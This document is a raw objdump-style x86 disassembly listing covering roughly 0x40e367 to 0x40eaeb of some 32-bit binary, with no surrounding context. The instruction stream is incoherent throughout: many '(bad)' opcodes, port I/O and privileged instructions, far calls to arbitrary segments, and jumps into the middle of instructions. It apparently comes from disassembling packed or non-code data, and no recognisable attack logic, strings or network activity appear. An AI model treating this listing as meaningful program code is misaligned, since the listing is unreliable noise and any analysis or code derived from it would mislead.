  40e367:	out    0xb0,eax
  40e369:	inc    esp
  40e36a:	pop    eax
  40e36b:	cmp    DWORD PTR [eax],edi
  40e36d:	mov    ch,0xc3
  40e36f:	popf   
  40e370:	xor    ah,BYTE PTR [eax+0x1b]
  40e373:	cmp    DWORD PTR [ebx-0x49],0x7c
  40e377:	push   ebp
  40e378:	jg     0x40e3ce
  40e37a:	adc    bl,BYTE PTR [edi-0x39]
  40e37d:	inc    esp
  40e37e:	jae    0x40e363
  40e380:	loopne 0x40e33d
  40e382:	jns    0x40e322
  40e384:	fistp  WORD PTR [ebp+eax*1+0x6d]
  40e388:	add    BYTE PTR [ebp-0x61],0x90
  40e38c:	ins    BYTE PTR es:[edi],dx
  40e38d:	test   eax,0x67fcca2b
  40e392:	mov    edx,0x62b649ff
  40e397:	sub    al,0x79
  40e399:	xchg   ecx,eax
  40e39a:	mov    cl,0x88
  40e39c:	sti    
  40e39d:	outs   dx,DWORD PTR ds:[esi]
  40e39e:	test   eax,ebx
  40e3a0:	call   0x4439:0xbab741bc
  40e3a7:	cmc    
  40e3a8:	jmp    0x40e35b
  40e3aa:	out    0xe3,eax
  40e3ac:	adc    al,0x45
  40e3ae:	mov    al,0x64
  40e3b0:	mov    BYTE PTR [ebp+0x6232d536],bh
  40e3b6:	push   eax
  40e3b7:	jl     0x40e400
  40e3b9:	stos   DWORD PTR es:[edi],eax
  40e3ba:	xchg   esp,eax
  40e3bb:	aad    0x36
  40e3bd:	rol    BYTE PTR [edi+0xd],cl
  40e3c0:	icebp  
  40e3c1:	daa    
  40e3c2:	add    dh,BYTE PTR ds:0xfdb4728c
  40e3c8:	or     al,0x34
  40e3ca:	and    al,BYTE PTR [edx]
  40e3cc:	or     BYTE PTR [edi],0x85
  40e3cf:	out    dx,al
  40e3d0:	jmp    0x40e36d
  40e3d2:	shr    DWORD PTR es:[ebp-0x77],1
  40e3d6:	push   esp
  40e3d7:	xlat   BYTE PTR ds:[ebx]
  40e3d8:	jecxz  0x40e415
  40e3da:	xor    ebp,DWORD PTR [ebp+eiz*4-0x2b]
  40e3de:	and    BYTE PTR [ebx],dl
  40e3e0:	and    DWORD PTR [ebx-0x22],edi
  40e3e3:	cdq    
  40e3e4:	aaa    
  40e3e5:	adc    al,0x76
  40e3e7:	push   esp
  40e3e8:	push   ebp
  40e3e9:	adc    ebx,0xf8e12bd
  40e3ef:	call   0x272d:0xa0330620
  40e3f6:	push   ds
  40e3f7:	sub    eax,0x99547906
  40e3fc:	int    0x75
  40e3fe:	fwait
  40e3ff:	je     0x40e3fb
  40e401:	dec    eax
  40e402:	mov    ah,0x96
  40e404:	mov    edx,0xc819740c
  40e409:	fs mov bh,0x16
  40e40c:	in     al,0x58
  40e40e:	sbb    eax,DWORD PTR [ebx-0x7b0c8b2d]
  40e414:	fdivr  QWORD PTR ds:0xecf34ed5
  40e41a:	inc    eax
  40e41b:	sbb    BYTE PTR [edi-0x56],ch
  40e41e:	xchg   edi,eax
  40e41f:	popf   
  40e420:	xor    esp,DWORD PTR ds:0x947feac3
  40e426:	dec    esi
  40e427:	sahf   
  40e428:	imul   ebx,DWORD PTR [ecx+0x734f6ee7],0x58
  40e42f:	dec    ebp
  40e430:	lea    edx,[ebp-0x48]
  40e433:	adc    DWORD PTR [ecx+0x1d80066b],ecx
  40e439:	jne    0x40e3ec
  40e43b:	mov    dl,0x2b
  40e43d:	aam    0x24
  40e43f:	cli    
  40e440:	or     eax,0x95e6699
  40e445:	cmp    al,0x23
  40e447:	or     BYTE PTR [edx],al
  40e449:	gs js  0x40e419
  40e44c:	scas   eax,DWORD PTR es:[edi]
  40e44d:	adc    eax,0x6189ffee
  40e452:	(bad)  
  40e453:	jmp    0x3168165e
  40e458:	in     al,dx
  40e459:	popa   
  40e45a:	ret    
  40e45b:	setle  BYTE PTR [esi-0x7ecabbcd]
  40e462:	ficom  WORD PTR [edi-0x60214b35]
  40e468:	call   0xead:0x9162114f
  40e46f:	arpl   WORD PTR [esi+0x51],bx
  40e472:	dec    ecx
  40e473:	dec    edx
  40e474:	je     0x40e47e
  40e476:	out    dx,al
  40e477:	loope  0x40e409
  40e479:	jl     0x40e4b2
  40e47b:	movhps QWORD PTR [ebp-0x7f],xmm3
  40e47f:	outs   dx,DWORD PTR ds:[esi]
  40e480:	scas   al,BYTE PTR es:[edi]
  40e481:	psubd  mm2,QWORD PTR [ebx+0x14]
  40e485:	sbb    ebp,DWORD PTR [esi+0x77]
  40e488:	adc    edx,eax
  40e48a:	dec    esi
  40e48b:	dec    ebx
  40e48c:	les    esi,FWORD PTR [ebx-0x6106a19f]
  40e492:	jl     0x40e501
  40e494:	or     BYTE PTR [edi-0x1b],bl
  40e497:	lods   eax,DWORD PTR ds:[esi]
  40e498:	jbe    0x40e4ef
  40e49a:	xchg   DWORD PTR [ecx],ebp
  40e49c:	inc    ebp
  40e49d:	xor    al,0x1d
  40e49f:	hlt    
  40e4a0:	sub    al,0x4c
  40e4a2:	call   0x122:0x36b8519c
  40e4a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4aa:	jge    0x40e486
  40e4ac:	jbe    0x40e49a
  40e4ae:	pop    eax
  40e4af:	(bad)  
  40e4b0:	pop    edi
  40e4b1:	popa   
  40e4b2:	popf   
  40e4b3:	mov    eax,0x3f2e601b
  40e4b8:	in     eax,0xb5
  40e4ba:	xchg   DWORD PTR [edx-0x53],esi
  40e4bd:	call   0x5319:0x2c465d5e
  40e4c4:	pushf  
  40e4c5:	sub    al,BYTE PTR [ebx]
  40e4c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4c8:	sahf   
  40e4c9:	jl     0x40e4c7
  40e4cb:	pop    esp
  40e4cc:	pop    ebx
  40e4cd:	sub    ah,ah
  40e4cf:	scas   al,BYTE PTR es:[edi]
  40e4d0:	ins    DWORD PTR es:[edi],dx
  40e4d1:	add    al,0xf6
  40e4d4:	nop
  40e4d5:	mov    bl,0x19
  40e4d7:	jp     0x40e4cc
  40e4d9:	outs   dx,DWORD PTR ds:[esi]
  40e4da:	loope  0x40e4a6
  40e4dc:	fist   DWORD PTR [edi+0x1e]
  40e4df:	pop    ecx
  40e4e0:	xor    esi,DWORD PTR [edi+0x6374eaaa]
  40e4e6:	sti    
  40e4e7:	lea    ecx,[eax+0x51]
  40e4ea:	jno    0x40e4c3
  40e4ec:	jns    0x40e474
  40e4ee:	test   BYTE PTR [esi+0x2d4de86e],al
  40e4f4:	lea    eax,[edi]
  40e4f6:	dec    esp
  40e4f7:	sahf   
  40e4f8:	mov    eax,ds:0xc533caf5
  40e4fd:	popf   
  40e4fe:	das    
  40e4ff:	sub    al,0xa3
  40e501:	aad    0x41
  40e503:	aam    0x3b
  40e505:	mov    ecx,0x4b8d6127
  40e50a:	xlat   BYTE PTR ds:[ebx]
  40e50b:	adc    eax,0x755fcdb7
  40e510:	in     eax,dx
  40e511:	xor    BYTE PTR gs:[edx+0x9],al
  40e515:	aaa    
  40e516:	cmc    
  40e517:	out    0x11,eax
  40e519:	pop    eax
  40e51a:	push   ds
  40e51b:	(bad)  
  40e51c:	push   ebp
  40e51d:	(bad)  
  40e51e:	fcomp  DWORD PTR [edx]
  40e520:	or     DWORD PTR [ebx-0x49],0xd
  40e524:	aaa    
  40e525:	mov    bh,0xa
  40e527:	sub    al,0xa
  40e529:	bound  edi,QWORD PTR [ecx+0x595c2d14]
  40e52f:	xchg   BYTE PTR ds:[ecx-0x3c],ah
  40e533:	adc    BYTE PTR [eax],ch
  40e535:	mov    DWORD PTR [edx+0xd],esp
  40e538:	push   ebx
  40e539:	inc    esp
  40e53a:	sub    al,0x1e
  40e53c:	cs retf 0x48b1
  40e540:	dec    ecx
  40e541:	test   BYTE PTR [ebp+ebp*8-0x59a50c4a],al
  40e548:	sub    eax,esp
  40e54a:	div    DWORD PTR [eax+0x7d3aa313]
  40e550:	add    dh,BYTE PTR [edi-0x205e40db]
  40e556:	gs inc edx
  40e558:	scas   eax,DWORD PTR es:[edi]
  40e559:	dec    esi
  40e55a:	jecxz  0x40e4fe
  40e55c:	sti    
  40e55d:	outs   dx,DWORD PTR ds:[esi]
  40e55e:	push   esi
  40e55f:	retf   0xfc4e
  40e562:	das    
  40e563:	(bad)  
  40e564:	xlat   BYTE PTR ds:[ebx]
  40e565:	jmp    0x9176d134
  40e56a:	add    eax,DWORD PTR [edx]
  40e56c:	adc    edi,DWORD PTR [edi]
  40e56e:	mov    ecx,DWORD PTR [esi+0x39]
  40e571:	mov    DWORD PTR [edx+0x5615ede8],esp
  40e577:	mov    esi,0xf5e5720e
  40e57c:	pop    ss
  40e57d:	sbb    edx,DWORD PTR [ebx]
  40e57f:	jbe    0x40e51d
  40e581:	push   ds
  40e582:	mov    bh,0x74
  40e584:	xchg   esp,eax
  40e585:	sbb    eax,0x7879e892
  40e58a:	lock jo 0x40e5af
  40e58d:	mov    bl,0xe2
  40e58f:	arpl   WORD PTR [edx],si
  40e591:	cmp    BYTE PTR [esi+esi*4-0x5fa1213d],bh
  40e598:	mul    ch
  40e59a:	mov    ch,0x48
  40e59c:	out    dx,al
  40e59d:	jle    0x40e556
  40e59f:	cmp    edi,0x84d9a51b
  40e5a5:	sub    eax,0x49685030
  40e5aa:	ja     0x40e61a
  40e5ac:	jo     0x40e58b
  40e5ae:	cdq    
  40e5af:	pop    es
  40e5b0:	mov    ebx,0xe9eceb9a
  40e5b5:	mov    edi,0xa4084843
  40e5ba:	pop    ds
  40e5bb:	test   dl,cl
  40e5bd:	stc    
  40e5be:	retf   
  40e5bf:	call   0xf9e:0x196721e5
  40e5c6:	mov    ds:0x718871f5,al
  40e5cb:	mov    ebp,0x105f4d48
  40e5d0:	pushf  
  40e5d1:	outs   dx,BYTE PTR ds:[esi]
  40e5d2:	dec    esp
  40e5d3:	xlat   BYTE PTR ds:[ebx]
  40e5d4:	mov    ecx,0xa3039b57
  40e5d9:	sub    bl,bh
  40e5db:	mov    DWORD PTR [ebx+0x39c1c388],0x5a0bb9b
  40e5e5:	sub    DWORD PTR [esi-0x62a85035],ebp
  40e5eb:	retf   0x75a8
  40e5ee:	out    0x23,eax
  40e5f0:	test   BYTE PTR [edx-0x2c],0xec
  40e5f4:	pop    ebp
  40e5f5:	and    eax,0xf68163fd
  40e5fa:	test   BYTE PTR [esi-0x4b736835],0x3b
  40e601:	xlat   BYTE PTR ds:[ebx]
  40e602:	inc    esp
  40e603:	pop    ecx
  40e604:	cmp    edx,ecx
  40e606:	pop    es
  40e607:	loope  0x40e5bc
  40e609:	jp     0x40e5c8
  40e60b:	and    al,0x31
  40e60d:	xor    eax,0xa4b14601
  40e612:	cli    
  40e613:	or     BYTE PTR [eax],ch
  40e615:	adc    eax,0x38ed45b4
  40e61a:	std    
  40e61b:	not    DWORD PTR [ebp+0x1c]
  40e61e:	fld    DWORD PTR [esi-0x61]
  40e621:	adc    eax,0x1e17968e
  40e626:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e627:	ret    
  40e628:	xchg   ebx,eax
  40e629:	xchg   esi,eax
  40e62a:	fwait
  40e62b:	cs (bad) 
  40e62d:	punpckhbw mm4,QWORD PTR [eax+0x738384]
  40e634:	dec    edx
  40e635:	inc    edx
  40e636:	loope  0x40e5e7
  40e638:	scas   al,BYTE PTR es:[edi]
  40e639:	and    dl,BYTE PTR [edx]
  40e63b:	jns    0x40e5dd
  40e63d:	in     al,dx
  40e63e:	(bad)  
  40e63f:	aas    
  40e640:	and    al,BYTE PTR ds:0x9853453
  40e646:	iret   
  40e647:	and    DWORD PTR [edx+edx*2-0x3e],0x9a4947f0
  40e64f:	gs pop edi
  40e651:	xor    BYTE PTR [ecx+0x20a7da2b],bh
  40e657:	pop    ecx
  40e658:	(bad)  
  40e659:	mov    eax,ds:0xbaece705
  40e65e:	mov    BYTE PTR [edx+0xf],cl
  40e661:	stc    
  40e662:	ror    DWORD PTR [esi+0x79],1
  40e665:	and    esp,DWORD PTR [edi+0x320b0d69]
  40e66b:	add    bl,cl
  40e66d:	push   edi
  40e66e:	ja     0x40e6e5
  40e670:	fild   QWORD PTR [edi-0xf065957]
  40e676:	inc    esp
  40e677:	xchg   ebx,eax
  40e678:	adc    al,dl
  40e67a:	mov    es,WORD PTR [ebp+edx*4+0x5f]
  40e67e:	sub    eax,0xb0e11387
  40e683:	inc    ebx
  40e684:	mov    DWORD PTR [eax+0x37],edx
  40e687:	dec    edi
  40e688:	pop    edi
  40e689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e68a:	cmp    ch,dh
  40e68c:	int    0x7d
  40e68e:	imul   bh
  40e690:	mov    esp,0xd4a529e
  40e695:	sbb    bl,BYTE PTR [eax-0x7e]
  40e698:	arpl   si,bx
  40e69a:	hlt    
  40e69b:	xlat   BYTE PTR ds:[ebx]
  40e69c:	mov    ebp,DWORD PTR [esi]
  40e69e:	add    BYTE PTR [ebx+0x7d82a2dd],cl
  40e6a4:	inc    edx
  40e6a5:	ins    DWORD PTR es:[edi],dx
  40e6a6:	lahf   
  40e6a7:	xchg   esp,eax
  40e6a8:	pop    ecx
  40e6a9:	sub    eax,0xfa1ccbb4
  40e6ae:	out    0x13,al
  40e6b0:	retf   
  40e6b1:	in     al,0x91
  40e6b3:	cmp    al,0xed
  40e6b5:	adc    al,0x7f
  40e6b7:	pusha  
  40e6b8:	inc    edx
  40e6b9:	pop    eax
  40e6ba:	daa    
  40e6bb:	push   edi
  40e6bc:	push   esi
  40e6bd:	mov    ebp,0x5a82cb2e
  40e6c2:	(bad)  
  40e6c3:	test   eax,0x42bc790e
  40e6c8:	fbld   TBYTE PTR [ebx-0xc8e2a5c]
  40e6ce:	lock inc edx
  40e6d0:	and    BYTE PTR [eax+0xa],ah
  40e6d3:	jae    0x40e6aa
  40e6d5:	fcomp  QWORD PTR [esi-0x665b9bf4]
  40e6db:	enter  0x27bb,0xf5
  40e6df:	sar    BYTE PTR [esi],cl
  40e6e1:	out    dx,al
  40e6e2:	loop   0x40e67e
  40e6e4:	xor    al,0xc
  40e6e6:	fidivr WORD PTR [ebp+0x6f]
  40e6e9:	pop    es
  40e6ea:	pushf  
  40e6eb:	(bad)  
  40e6ec:	std    
  40e6ed:	mov    DWORD PTR [ebx+ebx*4-0x3ec9e545],edi
  40e6f4:	popa   
  40e6f5:	rcr    DWORD PTR [eax],0xe
  40e6f8:	adc    DWORD PTR [edx-0x49],esp
  40e6fb:	dec    eax
  40e6fc:	dec    edi
  40e6fd:	push   ebx
  40e6fe:	clc    
  40e6ff:	add    BYTE PTR [ecx-0x7d],0x77
  40e703:	test   BYTE PTR [edx+0x45f9d1b3],ah
  40e709:	inc    eax
  40e70a:	sub    DWORD PTR [esi-0x9],ebx
  40e70d:	or     ch,dh
  40e70f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e710:	inc    esi
  40e711:	mov    al,ds:0x9690d5c9
  40e716:	sbb    al,0x10
  40e718:	(bad)  
  40e71a:	fxch   st(4)
  40e71c:	gs ret 
  40e71e:	data16 add dl,dh
  40e721:	idiv   BYTE PTR [edi]
  40e723:	cmp    DWORD PTR [edx+ebp*8-0xeec3b1d],ebx
  40e72a:	loop   0x40e6e0
  40e72c:	test   al,0x65
  40e72e:	retf   0xdf8c
  40e731:	jle    0x40e6e6
  40e733:	push   ebp
  40e734:	ins    BYTE PTR es:[edi],dx
  40e735:	or     dh,cl
  40e737:	xchg   ecx,eax
  40e738:	pop    es
  40e739:	shl    esp,1
  40e73b:	ins    DWORD PTR es:[edi],dx
  40e73c:	xchg   ebp,eax
  40e73d:	inc    ecx
  40e73e:	xor    BYTE PTR [esi+0x7],ah
  40e741:	repnz xchg esi,eax
  40e743:	outs   dx,DWORD PTR ds:[esi]
  40e744:	adc    ah,cl
  40e746:	dec    eax
  40e747:	push   esi
  40e748:	ret    
  40e749:	ss loop 0x40e738
  40e74c:	sub    BYTE PTR [ebx-0x27],ah
  40e74f:	mov    cl,0x82
  40e751:	pop    es
  40e752:	jmp    0x8138:0x4dadf9
  40e759:	mov    ebp,0x5066da3
  40e75e:	push   esi
  40e75f:	add    BYTE PTR [ebp-0x479c5dc9],0x11
  40e766:	mov    ah,0x40
  40e768:	jb     0x40e704
  40e76a:	out    dx,al
  40e76b:	or     esp,edx
  40e76d:	outs   dx,DWORD PTR ds:[esi]
  40e76e:	test   al,0x95
  40e770:	loop   0x40e729
  40e772:	mov    dh,0x93
  40e774:	and    eax,0x6316f186
  40e779:	sub    eax,0xe0a3958e
  40e77e:	xchg   ecx,eax
  40e77f:	leave  
  40e780:	js     0x40e765
  40e782:	cli    
  40e783:	xor    eax,0x69cd6ce
  40e788:	push   esi
  40e789:	mov    cl,0xca
  40e78b:	jb     0x40e7c9
  40e78d:	add    dh,0x34
  40e790:	adc    BYTE PTR [ecx],cl
  40e792:	add    al,0xa5
  40e794:	inc    BYTE PTR [ebx]
  40e796:	out    0xc2,al
  40e798:	stc    
  40e799:	jmp    0xb5a4:0xfebce318
  40e7a0:	jno    0x40e7f9
  40e7a2:	ins    DWORD PTR es:[edi],dx
  40e7a3:	test   esp,edi
  40e7a5:	or     BYTE PTR [ebx+0xc948618],dh
  40e7ab:	rcl    dl,1
  40e7ad:	pop    ebx
  40e7ae:	aam    0xe9
  40e7b0:	dec    ebp
  40e7b1:	imul   BYTE PTR fs:[edi-0x588f1b45]
  40e7b8:	loope  0x40e7d3
  40e7ba:	pop    ss
  40e7bb:	mov    eax,0xddbb5eb6
  40e7c0:	lea    ecx,[ecx-0x34]
  40e7c3:	jge    0x40e821
  40e7c5:	cpuid  
  40e7c7:	cdq    
  40e7c8:	lods   eax,DWORD PTR ds:[esi]
  40e7c9:	pop    esp
  40e7ca:	pushw  es
  40e7cc:	loopne 0x40e790
  40e7ce:	and    edx,DWORD PTR [ebp+0x6]
  40e7d1:	adc    DWORD PTR [eax],edx
  40e7d3:	aam    0x7f
  40e7d5:	test   BYTE PTR [esi-0x4],0x7c
  40e7d9:	int3   
  40e7da:	es xor eax,0x425de71d
  40e7e0:	test   BYTE PTR [edi],0x9
  40e7e3:	aas    
  40e7e4:	push   ss
  40e7e5:	out    0xef,al
  40e7e7:	dec    ebp
  40e7e8:	sub    ch,BYTE PTR [di]
  40e7eb:	adc    al,0xa7
  40e7ed:	and    esp,DWORD PTR [edi-0x4dc8d0c4]
  40e7f3:	scas   eax,DWORD PTR es:[edi]
  40e7f4:	mov    esi,0xb323cd9f
  40e7f9:	mov    BYTE PTR [esi+ecx*4+0x18],bh
  40e7fd:	int3   
  40e7fe:	lods   al,BYTE PTR ds:[esi]
  40e7ff:	dec    ecx
  40e800:	sbb    al,0xae
  40e802:	xchg   BYTE PTR [eax+0x43],ah
  40e805:	adc    BYTE PTR [ebx],bh
  40e807:	in     al,0x11
  40e809:	ja     0x40e82e
  40e80b:	jbe    0x40e7f7
  40e80d:	push   ds
  40e80e:	pushf  
  40e80f:	mov    ds:0x33552193,eax
  40e814:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40e816:	xchg   ebx,eax
  40e817:	jle    0x40e82b
  40e819:	fs aad 0x26
  40e81c:	stos   BYTE PTR es:[edi],al
  40e81d:	mov    eax,esi
  40e81f:	adc    dh,ch
  40e821:	(bad)  
  40e822:	cmc    
  40e823:	mov    edi,0x2d150ac8
  40e828:	add    BYTE PTR [edi],bl
  40e82a:	push   cs
  40e82b:	ds inc esi
  40e82d:	(bad)  
  40e82e:	mov    ebx,0xe5085a6f
  40e833:	cmc    
  40e834:	push   ebp
  40e835:	mov    ecx,0xf8ede1a2
  40e83a:	xor    al,bh
  40e83c:	sbb    eax,0x2bc4db21
  40e841:	mov    fs,WORD PTR [ebx]
  40e843:	dec    ebx
  40e844:	inc    eax
  40e845:	mov    bh,0x6c
  40e847:	mov    edi,0xa236fb8a
  40e84c:	pop    esi
  40e84d:	mov    ebx,0xa02093e3
  40e852:	rcl    BYTE PTR [edx+0x1f],0x68
  40e856:	(bad)  [eax+0x31]
  40e859:	fst    QWORD PTR ds:0xb68fe30c
  40e85f:	mov    edx,0x9e5a29a6
  40e864:	fucomip st,st(3)
  40e866:	nop
  40e867:	cmp    ebp,DWORD PTR [eax+0x49192d83]
  40e86d:	cmc    
  40e86e:	lea    eax,[esi+0xc70f51e]
  40e874:	(bad)  
  40e875:	mov    esp,0x395a0ca7
  40e87a:	imul   ecx,DWORD PTR [ebp+0x47ef6be],0xe16f2d87
  40e884:	aas    
  40e885:	arpl   WORD PTR [ebx+ebp*4+0x4b179b86],bp
  40e88c:	sbb    dh,ch
  40e88e:	mov    cl,0xc4
  40e890:	xchg   BYTE PTR [ecx-0x1bc003f2],cl
  40e896:	js     0x40e85d
  40e898:	push   ss
  40e899:	xor    DWORD PTR ds:0xfba1700f,edx
  40e89f:	loop   0x40e912
  40e8a1:	jnp    0x40e8aa
  40e8a3:	mov    ds:0x9f348420,eax
  40e8a8:	mov    esp,0xcf9844fb
  40e8ad:	mov    ecx,0x709742d6
  40e8b2:	les    esi,FWORD PTR [edi]
  40e8b4:	lock int 0x87
  40e8b7:	inc    ebx
  40e8b8:	adc    eax,0x57d70efe
  40e8bd:	loope  0x40e88e
  40e8bf:	and    BYTE PTR [esi],ah
  40e8c1:	int    0xff
  40e8c3:	xor    eax,0x9953523b
  40e8c8:	dec    edi
  40e8c9:	push   edi
  40e8ca:	inc    ebx
  40e8cb:	fimul  DWORD PTR [esi-0x73b2034c]
  40e8d1:	stc    
  40e8d2:	push   cs
  40e8d3:	jp     0x40e8eb
  40e8d5:	push   edi
  40e8d6:	leave  
  40e8d7:	add    esi,DWORD PTR [bx-0xb3f]
  40e8dc:	mov    edx,0xc0c35c27
  40e8e1:	pop    ebx
  40e8e2:	std    
  40e8e3:	push   ebx
  40e8e4:	jno    0x40e8e5
  40e8e6:	jg     0x40e8c2
  40e8e8:	adc    DWORD PTR [edx+0x40],esi
  40e8eb:	cwde   
  40e8ec:	xchg   esp,eax
  40e8ed:	mov    esp,0xae1c5c64
  40e8f2:	jne    0x40e91a
  40e8f4:	adc    BYTE PTR [edi+esi*2+0x6c693174],ch
  40e8fb:	and    esi,DWORD PTR [edi]
  40e8fd:	(bad)  
  40e8fe:	bound  ebx,QWORD PTR [ebx]
  40e900:	mov    dh,0xd7
  40e902:	cli    
  40e903:	(bad)  
  40e904:	fdivr  QWORD PTR [esp+esi*2-0xd]
  40e908:	inc    esp
  40e909:	jne    0x40e895
  40e90b:	retf   
  40e90c:	fcmovnu st,st(6)
  40e90e:	std    
  40e90f:	retf   0x2ef0
  40e912:	loopne 0x40e8ce
  40e914:	fimul  WORD PTR [ebx+0x64]
  40e917:	outs   dx,BYTE PTR ds:[esi]
  40e918:	pop    ss
  40e919:	xor    ebp,DWORD PTR gs:0x10590511
  40e920:	ss int 0x9d
  40e923:	ja     0x40e972
  40e925:	jae    0x40e977
  40e927:	outs   dx,BYTE PTR ds:[esi]
  40e928:	scas   eax,DWORD PTR es:[edi]
  40e929:	pop    ebp
  40e92a:	add    ch,0xfe
  40e92d:	cmp    ecx,DWORD PTR [ecx]
  40e92f:	imul   edi,edi,0xfffffffa
  40e932:	lods   eax,DWORD PTR ds:[esi]
  40e933:	jle    0x40e8ed
  40e935:	inc    eax
  40e936:	cwde   
  40e937:	mov    BYTE PTR [edx-0x25c7e2b6],dh
  40e93d:	mov    bl,0x7e
  40e93f:	inc    BYTE PTR [edi-0x13]
  40e942:	adc    eax,0xa879e861
  40e947:	into   
  40e948:	stc    
  40e949:	add    DWORD PTR [edx-0x931c58d],ebx
  40e94f:	mov    ecx,0xe1ef8531
  40e954:	push   ebp
  40e955:	adc    esp,edi
  40e957:	adc    DWORD PTR [ecx],edi
  40e959:	sbb    DWORD PTR [edi+0x3a],esi
  40e95c:	cmp    al,0x6
  40e95e:	and    al,0xf1
  40e960:	scas   al,BYTE PTR es:[edi]
  40e961:	xchg   BYTE PTR [ebx-0x50],al
  40e964:	ret    0x32bb
  40e967:	mov    esp,0xe461cd01
  40e96c:	cmp    eax,0xa97f543c
  40e971:	nop
  40e972:	clc    
  40e973:	ss xor al,0x5b
  40e976:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e977:	jmp    0x5a9e:0xbb1933da
  40e97e:	mov    al,0x80
  40e980:	and    al,0xe1
  40e982:	fwait
  40e983:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e984:	jg     0x40e925
  40e986:	and    eax,0x9817bd39
  40e98b:	mov    dl,0x85
  40e98d:	shl    DWORD PTR [ebp-0x2b5b65f3],0x4b
  40e994:	or     cl,BYTE PTR [ebx-0x307aa03c]
  40e99a:	aad    0xdd
  40e99c:	mov    edx,0x4aa29fd7
  40e9a1:	cmp    BYTE PTR [ecx+0x1308dc96],bh
  40e9a7:	push   fs
  40e9a9:	cwde   
  40e9aa:	leave  
  40e9ab:	xchg   DWORD PTR [eax],eax
  40e9ad:	nop
  40e9ae:	fist   WORD PTR [esi+0xc]
  40e9b1:	push   ss
  40e9b2:	inc    ebx
  40e9b3:	mov    ebx,0x990ddf9f
  40e9b8:	xchg   ebp,eax
  40e9b9:	setbe  BYTE PTR [ebp+0x258f66db]
  40e9c0:	jnp    0x40e960
  40e9c2:	ror    esi,1
  40e9c4:	rcr    edi,1
  40e9c6:	(bad)  
  40e9c7:	shl    BYTE PTR [edi-0x4c],1
  40e9ca:	push   cs
  40e9cb:	push   esi
  40e9cc:	fs jmp 0x93f9:0x1b9ce2cb
  40e9d4:	mov    ebx,0xb0e6868c
  40e9d9:	mov    ds:0x6e0eb224,eax
  40e9de:	rol    ebp,cl
  40e9e0:	or     dh,BYTE PTR [edi-0x2b]
  40e9e3:	imul   ecx,DWORD PTR [edx],0x21eb49aa
  40e9e9:	test   al,0xe4
  40e9eb:	pop    edi
  40e9ec:	adc    cl,bl
  40e9ee:	out    0xb5,eax
  40e9f0:	jnp    0x40e9d6
  40e9f2:	loop   0x40e986
  40e9f4:	or     eax,esp
  40e9f6:	stos   BYTE PTR es:[edi],al
  40e9f7:	fiadd  WORD PTR gs:[ebx+0x48ec610]
  40e9fe:	pop    ebx
  40e9ff:	xor    BYTE PTR [ecx],bl
  40ea01:	aaa    
  40ea02:	adc    BYTE PTR [edi],bh
  40ea04:	std    
  40ea05:	push   es
  40ea06:	sbb    ecx,DWORD PTR ds:[edx+0x3f4d5818]
  40ea0d:	cmp    eax,0x92b84f4c
  40ea12:	adc    ch,dl
  40ea14:	push   eax
  40ea15:	inc    edx
  40ea16:	xchg   esi,eax
  40ea17:	add    edx,DWORD PTR [ebx+0x30a1662a]
  40ea1d:	loopne 0x40ea5c
  40ea1f:	push   ds
  40ea20:	in     eax,dx
  40ea21:	(bad)  
  40ea22:	cmp    BYTE PTR [eax-0x5527a19c],dl
  40ea28:	dec    esp
  40ea29:	mul    DWORD PTR [edi+0x8]
  40ea2c:	xchg   DWORD PTR [eax],edx
  40ea2e:	inc    eax
  40ea2f:	(bad)  
  40ea30:	jae    0x40ea83
  40ea32:	mov    eax,ds:0x4d634a86
  40ea37:	xor    BYTE PTR [ecx-0x36099488],ch
  40ea3d:	mov    edi,0x3d2ce4d5
  40ea42:	sbb    dh,ch
  40ea44:	in     al,0xb0
  40ea46:	xlat   BYTE PTR ds:[ebx]
  40ea47:	xchg   edx,eax
  40ea48:	idiv   BYTE PTR [ecx+ecx*8+0x7b]
  40ea4c:	repz or edx,eax
  40ea4f:	std    
  40ea50:	mov    ecx,DWORD PTR [edi+esi*8-0x3c]
  40ea54:	cs mov eax,?
  40ea57:	jbe    0x40e9e5
  40ea59:	mov    ebx,0x748f906d
  40ea5e:	or     esi,DWORD PTR [edi+0x46a4df5]
  40ea64:	dec    ecx
  40ea65:	in     al,0x64
  40ea67:	rcr    edx,0xe
  40ea6a:	imul   eax,eax,0x68
  40ea6d:	xor    BYTE PTR [eax-0x1706d283],0xda
  40ea74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea75:	fsub   QWORD PTR [esi-0x3c5c3c3b]
  40ea7b:	aam    0x71
  40ea7d:	push   esi
  40ea7e:	mov    BYTE PTR [ecx+0x57880c03],bl
  40ea84:	adc    eax,0x136c45cd
  40ea89:	dec    edx
  40ea8a:	mov    esi,0x61f91d27
  40ea8f:	push   esi
  40ea90:	or     BYTE PTR [edx+esi*4-0x7c7a16aa],cl
  40ea97:	repnz pop edx
  40ea99:	xchg   edx,eax
  40ea9a:	cmp    al,0x11
  40ea9c:	push   es
  40ea9d:	or     esi,DWORD PTR [edi+esi*1+0x6a86b3a4]
  40eaa4:	add    eax,0x19a5ad7f
  40eaa9:	or     eax,0xe43dec3d
  40eaae:	push   es
  40eaaf:	pop    ds
  40eab0:	(bad)  
  40eab1:	mov    ?,eax
  40eab3:	push   0xf50a9287
  40eab8:	sar    DWORD PTR [edx+esi*2-0x39dee7e],1
  40eabf:	push   0xffffffe0
  40eac1:	int3   
  40eac2:	mov    cl,0x67
  40eac4:	xor    DWORD PTR [esi+0x5ef9925],0xffffff9d
  40eacb:	fisubr WORD PTR [ebp-0x68]
  40eace:	and    dh,BYTE PTR [esi+0x7c]
  40ead1:	push   edi
  40ead2:	sbb    bh,BYTE PTR [ebp+0xe9b189b]
  40ead8:	jb     0x40eb36
  40eada:	mov    al,0x87
  40eadc:	ret    0xe632
  40eadf:	int3   
  40eae0:	sti    
  40eae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eae2:	icebp  
  40eae3:	pop    ss
  40eae4:	mov    eax,0x1b35446a
  40eae9:	scas   eax,DWORD PTR es:[edi]
  40eaea:	inc    ebp
  40eaeb:	or     DWORD PTR [edi-0x50],ebx
